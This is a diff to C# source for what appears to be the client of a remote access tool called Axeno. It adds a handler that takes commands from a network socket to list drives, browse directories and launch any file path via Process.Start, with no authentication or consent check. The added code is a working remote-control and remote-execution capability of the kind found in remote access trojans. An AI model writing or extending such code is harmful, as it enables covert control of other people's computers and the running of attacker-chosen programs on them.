@@ -1,6 +1,7 @@
 ﻿using Axeno.Client.MessagePack;
 using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
@@ -14,6 +15,27 @@ namespace Axeno.Client.Networking.Functions.System
 {
     internal class FileManager
     {
+        public static void HandleCommand(MsgPack msgpck)
+        {
+            string command = msgpck.ForcePathObject("Command").AsString;
+            switch (command) {
+                case "GetDrives":
+                    ClientSocket.QueueCommand(FileManager.GetDrives());
+                    break;
+                case "GetDirectory":
+                    {
+                        string dir = msgpck.ForcePathObject("Directory").AsString;
+                        ClientSocket.QueueCommand(FileManager.GetDirectory(dir));
+                        break;
+                    }
+                case "ExecuteFile":
+                    {
+                        string fpath = msgpck.ForcePathObject("Path").AsString;
+                        Process.Start(fpath);
+                        break;
+                    }
+            }
+        }
         public static byte[] GetDrives()
         {
             DriveInfo[] allDrives = DriveInfo.GetDrives();
